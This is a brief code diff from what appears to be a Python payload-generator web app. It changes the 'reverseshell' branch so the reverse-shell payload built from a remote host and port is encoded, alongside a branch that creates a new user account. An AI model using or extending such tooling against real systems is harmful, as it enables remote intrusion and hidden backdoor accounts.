@@ -237,7 +237,7 @@ def index ():
                 result = encode(line, Createnewuser(line['userName'], line['password']))
                 line['psline'] = result
             if line['command_name'] == 'reverseshell':
-                result = shell1(line['rhost'], line['rport'])
+                result = encode(line, shell1(line['rhost'], line['rport']))
                 line['psline'] = result
                 print(result)
 
